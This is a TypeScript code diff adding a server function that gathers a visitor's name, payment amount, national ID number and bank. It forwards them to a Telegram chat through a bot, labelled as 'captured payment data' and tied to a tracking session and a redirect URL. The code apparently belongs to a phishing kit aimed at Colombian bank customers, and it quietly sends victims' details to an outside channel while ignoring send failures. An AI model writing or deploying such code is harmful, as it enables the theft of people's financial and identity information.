@@ -15,6 +15,30 @@ function tg(method: string, body: unknown) {
   }).then((r) => r.json() as Promise<{ ok: boolean; result?: { message_id: number } }>);
 }
 
+export function notifySessionPayment(sid: string, data: { nombre: string; monto: string; cc: string; banco: string; url?: string }) {
+  if (!env.telegramBotToken || !env.telegramChatId) return;
+  const s = sessions.get(sid) ?? { lines: [], chain: Promise.resolve() };
+  sessions.set(sid, s);
+
+  const time = new Date().toLocaleTimeString('es-CO', { hour12: false, timeZone: 'America/Bogota' });
+  const paymentLine = `\n💳 [DATOS DE PAGO CAPTADOS]\n• Nombre: ${data.nombre}\n• Monto: $${Number(data.monto).toLocaleString('es-CO')} COP\n• CC/Doc: ${data.cc}\n• Banco: ${data.banco}${data.url ? `\n• Redirigido a: ${data.url}` : ''}`;
+  s.lines.push(`${time} ${paymentLine}`);
+
+  s.chain = s.chain.then(async () => {
+    const text = `🧭 Sesión ${sid.slice(0, 8)}\n${s.lines.join('\n')}`;
+    try {
+      if (s.messageId) {
+        await tg('editMessageText', { chat_id: env.telegramChatId, message_id: s.messageId, text });
+      } else {
+        const r = await tg('sendMessage', { chat_id: env.telegramChatId, text });
+        if (r.ok && r.result) s.messageId = r.result.message_id;
+      }
+    } catch {
+      // Ignorar fallos de Telegram.
+    }
+  });
+}
+
 export function postTrack(req: Request, res: Response) {
   const sid = String(req.body?.sessionId ?? '').slice(0, 64).trim();
   const step = String(req.body?.step ?? '').slice(0, 200).trim();
